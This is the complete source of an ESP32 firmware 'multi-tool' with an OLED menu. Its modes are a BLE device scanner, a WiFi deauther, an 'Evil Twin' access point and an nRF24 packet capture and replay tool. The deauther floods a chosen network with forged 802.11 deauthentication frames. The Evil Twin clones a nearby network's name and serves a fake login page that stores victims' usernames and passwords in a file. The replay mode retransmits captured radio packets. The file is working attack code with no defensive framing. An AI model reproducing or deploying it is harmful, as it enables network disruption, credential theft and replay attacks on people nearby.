// =============================================================
// ESP32 MULTI-TOOL v1.0
// Modes: BLE Scanner | WiFi Deauther | Evil Twin | nRF24 Capture/Replay
// =============================================================

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <RF24.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

// =============================================================
// PINS
// =============================================================

#define OLED_SDA   21
#define OLED_SCL   22
#define NRF_CE      5
#define NRF_CSN    17

#define LED_RED     2
#define LED_BLUE   25
#define LED_GREEN  26
#define LED_YELLOW 27

#define SW_UP     32
#define SW_DOWN   33
#define SW_SELECT 34   // input-only pin — needs external 10k pullup to 3.3V
#define SW_BACK   35   // input-only pin — needs external 10k pullup to 3.3V
#define SW_FIRE   36   // input-only pin — needs external 10k pullup to 3.3V

// =============================================================
// GLOBALS
// =============================================================

#define SCREEN_W 128
#define SCREEN_H  64

Adafruit_SSD1306 display(SCREEN_W, SCREEN_H, &Wire, -1);
RF24 radio(NRF_CE, NRF_CSN);

enum AppMode {
  MODE_MENU = 0,
  MODE_BLE_SCAN,
  MODE_DEAUTH,
  MODE_EVIL_TWIN,
  MODE_NRF_CAPTURE,
  MODE_NRF_REPLAY,
  MODE_COUNT
};

const char* modeNames[] = {
  "MENU",
  "BLE Scanner",
  "WiFi Deauther",
  "Evil Twin AP",
  "nRF24 Capture",
  "nRF24 Replay",
};

AppMode currentMode = MODE_MENU;
int menuIndex = 0;

// Button debounce
unsigned long lastBtn[5] = {0};
const unsigned long DEBOUNCE_MS = 220;
const int swPins[5] = { SW_UP, SW_DOWN, SW_SELECT, SW_BACK, SW_FIRE };

bool btn(int idx) {
  if (digitalRead(swPins[idx]) == LOW && millis() - lastBtn[idx] > DEBOUNCE_MS) {
    lastBtn[idx] = millis();
    return true;
  }
  return false;
}

void ledsOff() {
  digitalWrite(LED_RED,    LOW);
  digitalWrite(LED_BLUE,   LOW);
  digitalWrite(LED_GREEN,  LOW);
  digitalWrite(LED_YELLOW, LOW);
}

// =============================================================
// OLED HELPERS
// =============================================================

void oledHeader(const char* title) {
  display.fillRect(0, 0, SCREEN_W, 11, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(2, 2);
  display.print(title);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 13);
}

void oledFooter(const char* hint) {
  display.setCursor(0, 57);
  display.print(hint);
}

void oledClear() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
}

// =============================================================
// MENU
// =============================================================

const int NUM_MODES = MODE_COUNT - 1; // skip MODE_MENU itself

void onModeEnter(AppMode mode);
void returnToMenu();

void drawMenu() {
  oledClear();
  oledHeader("~~~ MULTI-TOOL ~~~");
  for (int i = 0; i < 4; i++) {
    int idx = (menuIndex + i) % NUM_MODES + 1;
    display.setCursor(0, 14 + i * 12);
    display.print(i == 0 ? "> " : "  ");
    display.print(modeNames[idx]);
  }
  oledFooter("UP/DN  SEL:enter");
  display.display();
}

void handleMenu() {
  if (btn(0)) { menuIndex = (menuIndex - 1 + NUM_MODES) % NUM_MODES; drawMenu(); }
  if (btn(1)) { menuIndex = (menuIndex + 1) % NUM_MODES;             drawMenu(); }
  if (btn(2)) {
    currentMode = (AppMode)(menuIndex + 1);
    onModeEnter(currentMode);
  }
}

// =============================================================
// BLE SCANNER
// =============================================================

struct BLEEntry {
  char mac[18];
  char name[16];
  char type[8];
  int  rssi;
};

#define MAX_BLE 30
BLEEntry bleList[MAX_BLE];
int      bleCount  = 0;
int      bleScroll = 0;
bool     bleScanning = false;
BLEScan* bleScan = nullptr;

class MyBLECB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    const char* mac = dev.getAddress().toString().c_str();
    for (int i = 0; i < bleCount; i++) {
      if (strcmp(bleList[i].mac, mac) == 0) {
        bleList[i].rssi = dev.getRSSI();
        return;
      }
    }
    if (bleCount >= MAX_BLE) return;

    BLEEntry& e = bleList[bleCount];
    strncpy(e.mac,  mac, 17); e.mac[17] = 0;
    strncpy(e.name, dev.haveName() ? dev.getName().c_str() : "", 15); e.name[15] = 0;
    e.rssi = dev.getRSSI();
    strcpy(e.type, "GEN");

    if (dev.haveManufacturerData()) {
      String mfr = dev.getManufacturerData();
      if (mfr.length() >= 2) {
        if ((uint8_t)mfr[0] == 0x4C && (uint8_t)mfr[1] == 0x00) strcpy(e.type, "APPLE");
        if ((uint8_t)mfr[0] == 0x07 && (uint8_t)mfr[1] == 0x01) strcpy(e.type, "TILE");
      }
    }
    if (dev.haveServiceUUID()) {
      String uuid = dev.getServiceUUID().toString();
      if (uuid == "00001812-0000-1000-8000-00805f9b34fb") strcpy(e.type, "HID");
    }

    bleCount++;
    if (strcmp(e.type, "APPLE") == 0) digitalWrite(LED_RED, HIGH);
    if (strcmp(e.type, "HID")   == 0) digitalWrite(LED_BLUE, HIGH);
    if (e.rssi > -50)                 digitalWrite(LED_YELLOW, HIGH);
  }
};

void setupBLE() {
  BLEDevice::init("");
  bleScan = BLEDevice::getScan();
  bleScan->setAdvertisedDeviceCallbacks(new MyBLECB(), true);
  bleScan->setActiveScan(true);
  bleScan->setInterval(100);
  bleScan->setWindow(99);
}

void drawBLEScan() {
  oledClear();
  char header[20];
  snprintf(header, 20, "BLE SCAN [%d]", bleCount);
  oledHeader(header);

  if (bleCount == 0) {
    display.setCursor(10, 28);
    display.print(bleScanning ? "Scanning..." : "FIRE to scan");
  } else {
    for (int i = 0; i < 3; i++) {
      int idx = (bleScroll + i) % bleCount;
      display.setCursor(0, 14 + i * 17);
      display.printf("%-5s %4ddBm", bleList[idx].type, bleList[idx].rssi);
      display.setCursor(0, 14 + i * 17 + 8);
      display.print(bleList[idx].mac);
    }
  }
  oledFooter("UP/DN:scroll  FIRE:scan");
  display.display();
}

void handleBLEScan() {
  if (btn(4) && !bleScanning) {
    ledsOff();
    bleCount = 0; bleScroll = 0;
    bleScanning = true;
    bleScan->start(5, [](BLEScanResults) {
      bleScanning = false;
    }, false);
  }
  if (btn(0) && bleCount > 0) bleScroll = (bleScroll - 1 + bleCount) % bleCount;
  if (btn(1) && bleCount > 0) bleScroll = (bleScroll + 1) % bleCount;
  if (btn(3)) returnToMenu();
  drawBLEScan();
}

// =============================================================
// WIFI DEAUTHER
// =============================================================

struct APEntry {
  char    ssid[33];
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
};

#define MAX_APS 20
APEntry apList[MAX_APS];
int     apCount    = 0;
int     apScroll   = 0;
int     apSelected = 0;
bool    deauthing  = false;
bool    wifiReady  = false;

uint8_t deauthFrame[26] = {
  0xC0, 0x00,                               // type: deauth mgmt frame
  0x00, 0x00,                               // duration
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,            // dst: broadcast
  0x00,0x00,0x00,0x00,0x00,0x00,           // src: AP MAC (filled in)
  0x00,0x00,0x00,0x00,0x00,0x00,           // bssid: AP MAC (filled in)
  0x00, 0x00,                               // seq num
  0x07, 0x00                                // reason 7: class3 from nonassoc
};

void initWifiInject() {
  if (wifiReady) return;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_start();
  wifiReady = true;
}

void doWifiScan() {
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks(false, true);
  apCount = min(n, MAX_APS);
  for (int i = 0; i < apCount; i++) {
    strlcpy(apList[i].ssid, WiFi.SSID(i).c_str(), 33);
    apList[i].rssi    = WiFi.RSSI(i);
    apList[i].channel = WiFi.channel(i);
    memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
  }
  esp_wifi_set_mode(WIFI_MODE_APSTA);
}

void sendDeauth(int idx) {
  uint8_t* b = apList[idx].bssid;
  memcpy(&deauthFrame[10], b, 6);
  memcpy(&deauthFrame[16], b, 6);
  esp_wifi_set_channel(apList[idx].channel, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    delayMicroseconds(200);
  }
}

void drawDeauth() {
  oledClear();
  oledHeader(deauthing ? "DEAUTH [FIRING]" : "DEAUTH");

  if (apCount == 0) {
    display.setCursor(0, 24);
    display.print("FIRE: scan APs");
  } else {
    for (int i = 0; i < 3 && i < apCount; i++) {
      int idx = (apScroll + i) % apCount;
      bool sel = (idx == apSelected);
      display.setCursor(0, 14 + i * 16);
      display.printf("%s%.15s", sel ? ">" : " ", apList[idx].ssid);
      display.setCursor(0, 14 + i * 16 + 8);
      display.printf(" ch%d %ddBm %s",
        apList[idx].channel, apList[idx].rssi, sel ? "<<" : "");
    }
  }
  oledFooter("SEL:pick  FIRE:scan/go");
  display.display();
}

void handleDeauth() {
  if (btn(4)) {
    if (apCount == 0) {
      initWifiInject();
      doWifiScan();
    } else {
      deauthing = !deauthing;
      digitalWrite(LED_RED, deauthing);
    }
  }
  if (btn(0)) apScroll = (apScroll - 1 + max(apCount,1)) % max(apCount,1);
  if (btn(1)) apScroll = (apScroll + 1) % max(apCount,1);
  if (btn(2)) apSelected = apScroll;
  if (btn(3)) { deauthing = false; ledsOff(); returnToMenu(); return; }

  if (deauthing && apCount > 0) {
    sendDeauth(apSelected);
    digitalWrite(LED_RED, !digitalRead(LED_RED));
  }
  drawDeauth();
}

// =============================================================
// EVIL TWIN / CAPTIVE PORTAL
// =============================================================

DNSServer  dnsServer;
WebServer  httpServer(80);
bool       twinActive  = false;
int        credCount   = 0;
int        twinScroll  = 0;
char       twinSSID[33] = "Free_WiFi";

IPAddress apIP(192, 168, 4, 1);

const char* portalHTML = R"html(
<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign In</title>
<style>
 body{font-family:sans-serif;max-width:380px;margin:50px auto;padding:20px}
 input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;font-size:16px}
 button{width:100%;padding:12px;background:#0066CC;color:#fff;border:none;font-size:16px}
</style></head><body>
<h2>Network Login</h2>
<p>Sign in to access the internet.</p>
<form method='POST' action='/login'>
 <input name='u' placeholder='Email or Username' required>
 <input name='p' type='password' placeholder='Password' required>
 <button>Connect</button>
</form></body></html>
)html";

void startTwin(const char* ssid) {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(ssid, "", 6, 0, 4);
  dnsServer.start(53, "*", apIP);
  httpServer.on("/", HTTP_GET, [](){
    httpServer.send(200, "text/html", portalHTML);
  });
  httpServer.on("/login", HTTP_POST, [](){
    String u = httpServer.arg("u");
    String p = httpServer.arg("p");
    File f = SPIFFS.open("/creds.txt", FILE_APPEND);
    if (f) { f.printf("[%lus] %s : %s\n", millis()/1000, u.c_str(), p.c_str()); f.close(); }
    credCount++;
    digitalWrite(LED_GREEN, HIGH);
    httpServer.sendHeader("Location", "https://www.google.com");
    httpServer.send(302);
  });
  httpServer.onNotFound([](){
    httpServer.sendHeader("Location", "http://" + apIP.toString());
    httpServer.send(302);
  });
  httpServer.begin();
  twinActive = true;
}

void stopTwin() {
  httpServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  twinActive = false;
}

void drawEvilTwin() {
  oledClear();
  oledHeader(twinActive ? "EVIL TWIN [LIVE]" : "EVIL TWIN");

  if (!twinActive) {
    display.setCursor(0, 14);
    display.print("SSID to clone:");
    display.setCursor(0, 25);
    if (apCount > 0) {
      display.printf("> %.18s", apList[twinScroll % apCount].ssid);
    } else {
      display.print("> Free_WiFi  (no scan)");
    }
    display.setCursor(0, 38);
    display.print("UP/DN: pick  FIRE: go");
  } else {
    display.setCursor(0, 14);
    display.printf("SSID: %.18s", twinSSID);
    display.setCursor(0, 26);
    display.print("IP:   192.168.4.1");
    display.setCursor(0, 38);
    display.printf("Creds: %d captured", credCount);
    display.setCursor(0, 50);
    display.print("BACK to stop");
  }
  display.display();
}

void handleEvilTwin() {
  if (!twinActive) {
    if (btn(0) && apCount > 0) twinScroll--;
    if (btn(1) && apCount > 0) twinScroll++;
    if (twinScroll < 0) twinScroll = max(apCount-1, 0);
    if (apCount > 0)   twinScroll %= apCount;

    if (btn(4)) {
      if (apCount > 0) strlcpy(twinSSID, apList[twinScroll % apCount].ssid, 33);
      SPIFFS.begin(true);
      startTwin(twinSSID);
    }
  } else {
    dnsServer.processNextRequest();
    httpServer.handleClient();
  }
  if (btn(3)) { if (twinActive) stopTwin(); ledsOff(); returnToMenu(); return; }
  drawEvilTwin();
}

// =============================================================
// nRF24 CAPTURE + REPLAY
// =============================================================

#define MAX_PKTS 10
uint8_t  nrfPkts[MAX_PKTS][32];
int      nrfCount   = 0;
int      nrfScroll  = 0;
uint8_t  nrfChan    = 2;
bool     nrfCapOn   = false;
bool     nrfReady   = false;

const uint64_t PROMISC_ADDR = 0xAAAAAAAAAALL;

void setupNRF() {
  if (!radio.begin()) return;
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false);
  radio.disableCRC();
  radio.setPayloadSize(32);
  nrfReady = true;
}

void nrfStartCap() {
  radio.setChannel(nrfChan);
  radio.setAddressWidth(2);
  radio.openReadingPipe(1, PROMISC_ADDR);
  radio.startListening();
  nrfCapOn = true;
  digitalWrite(LED_BLUE, HIGH);
}

void nrfStopCap() {
  radio.stopListening();
  nrfCapOn = false;
  digitalWrite(LED_BLUE, LOW);
}

void nrfPoll() {
  if (!nrfCapOn || nrfCount >= MAX_PKTS) return;
  if (radio.available()) {
    radio.read(nrfPkts[nrfCount++], 32);
    digitalWrite(LED_YELLOW, HIGH);
    delay(40);
    digitalWrite(LED_YELLOW, LOW);
  }
}

void nrfReplay(int idx) {
  radio.stopListening();
  radio.setAddressWidth(5);
  radio.openWritingPipe(PROMISC_ADDR);
  radio.setChannel(nrfChan);
  for (int i = 0; i < 5; i++) {
    radio.write(nrfPkts[idx], 32);
    delay(8);
  }
  if (nrfCapOn) radio.startListening();
  digitalWrite(LED_RED, HIGH); delay(100); digitalWrite(LED_RED, LOW);
}

void drawNRF(bool replayMode) {
  oledClear();
  if (replayMode)       oledHeader("nRF24 REPLAY");
  else if (nrfCapOn)    oledHeader("nRF24 CAP [ON]");
  else                  oledHeader("nRF24 CAPTURE");

  display.setCursor(0, 14);
  display.printf("Chan: %3d   Pkts: %d/%d", nrfChan, nrfCount, MAX_PKTS);

  if (nrfCount == 0) {
    display.setCursor(0, 32);
    display.print(replayMode ? "No packets yet." : "FIRE: start/stop");
  } else {
    int idx = (nrfCount > 0) ? nrfScroll % nrfCount : 0;
    display.setCursor(0, 26);
    display.printf("Pkt #%d:", idx);
    display.setCursor(0, 36);
    for (int i = 0; i < 8; i++)  display.printf("%02X ", nrfPkts[idx][i]);
    display.setCursor(0, 46);
    for (int i = 8; i < 16; i++) display.printf("%02X ", nrfPkts[idx][i]);
  }

  if (replayMode) oledFooter("UP/DN:pkt  SEL:fire");
  else            oledFooter("UP/DN:chan  FIRE:cap");
  display.display();
}

void handleNRFCapture() {
  if (!nrfReady) {
    display.clearDisplay();
    display.setCursor(0, 28);
    display.print("nRF24 not found!");
    display.display();
    if (btn(3)) returnToMenu();
    return;
  }
  if (btn(4)) {
    if (nrfCapOn) nrfStopCap();
    else { nrfCount = 0; nrfScroll = 0; nrfStartCap(); }
  }
  if (btn(0)) nrfChan = min(nrfChan + 1, 125);
  if (btn(1)) nrfChan = max(nrfChan - 1, 0);
  if (btn(3)) { nrfStopCap(); returnToMenu(); return; }
  nrfPoll();
  drawNRF(false);
}

void handleNRFReplay() {
  if (btn(0) && nrfCount > 0) nrfScroll = (nrfScroll - 1 + nrfCount) % nrfCount;
  if (btn(1) && nrfCount > 0) nrfScroll = (nrfScroll + 1) % nrfCount;
  if (btn(2) && nrfCount > 0) nrfReplay(nrfScroll % nrfCount);
  if (btn(3)) { returnToMenu(); return; }
  drawNRF(true);
}

// =============================================================
// MODE TRANSITIONS
// =============================================================

void onModeEnter(AppMode mode) {
  ledsOff();
  switch (mode) {
    case MODE_BLE_SCAN:
      bleCount = 0; bleScroll = 0;
      break;
    case MODE_DEAUTH:
      initWifiInject();
      if (apCount == 0) doWifiScan();
      break;
    case MODE_EVIL_TWIN:
      credCount = 0; twinScroll = 0;
      SPIFFS.begin(true);
      break;
    case MODE_NRF_CAPTURE:
      nrfCount = 0; nrfScroll = 0;
      if (nrfReady) nrfStartCap();
      break;
    case MODE_NRF_REPLAY:
      break;
    default: break;
  }
}

void returnToMenu() {
  ledsOff();
  currentMode = MODE_MENU;
  drawMenu();
}

// =============================================================
// SETUP & LOOP
// =============================================================

void setup() {
  Serial.begin(115200);

  pinMode(LED_RED,    OUTPUT);
  pinMode(LED_BLUE,   OUTPUT);
  pinMode(LED_GREEN,  OUTPUT);
  pinMode(LED_YELLOW, OUTPUT);
  pinMode(SW_UP,   INPUT_PULLUP);
  pinMode(SW_DOWN, INPUT_PULLUP);
  // SW_SELECT/BACK/FIRE (34/35/36) are input-only; no internal pullup.
  // Connect a 10kΩ resistor from each pin to 3.3V.

  Wire.begin(OLED_SDA, OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("SSD1306 not found");
    while (1);
  }

  // Splash screen
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(18, 10);  display.print("MULTI");
  display.setCursor(22, 32);  display.print("-TOOL-");
  display.setTextSize(1);
  display.setCursor(28, 54);  display.print("ESP32  nRF24");
  display.display();

  // Boot LED chase
  for (int i = 0; i < 3; i++) {
    for (int p : {LED_RED, LED_BLUE, LED_GREEN, LED_YELLOW}) {
      digitalWrite(p, HIGH); delay(80); digitalWrite(p, LOW);
    }
  }

  setupBLE();
  setupNRF();
  SPIFFS.begin(true);

  delay(500);
  drawMenu();
}

void loop() {
  switch (currentMode) {
    case MODE_MENU:        handleMenu();        break;
    case MODE_BLE_SCAN:    handleBLEScan();     break;
    case MODE_DEAUTH:      handleDeauth();      break;
    case MODE_EVIL_TWIN:   handleEvilTwin();    break;
    case MODE_NRF_CAPTURE: handleNRFCapture();  break;
    case MODE_NRF_REPLAY:  handleNRFReplay();   break;
  }
}
